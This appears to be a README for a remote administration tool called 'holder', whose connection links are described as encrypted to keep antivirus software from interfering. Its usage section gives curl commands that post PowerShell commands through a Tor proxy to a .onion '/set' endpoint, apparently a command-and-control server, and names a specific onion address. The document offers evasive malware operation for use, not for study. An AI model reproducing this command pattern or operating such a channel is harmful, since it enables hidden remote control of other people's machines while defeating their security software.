# holder
Contains remote administration powershell script, as well as links used for connection that have been encrypted to prevent AVs from interfering.

## Usage
```batch
curl --socks5-hostname 127.0.0.1:9050 -X POST -H "Content-Type: text/plain" --data "<Powershell command>" http://<onion-link>.onion/set
```
Example usage:
```batch
curl --socks5-hostname 127.0.0.1:9050 -X POST -H "Content-Type: text/plain" --data "Get-Date" http://ld52qe2n47otqd63u4jqv26yyev64z2jucgidqisriv7x3fxuoetfjid.onion/set
```
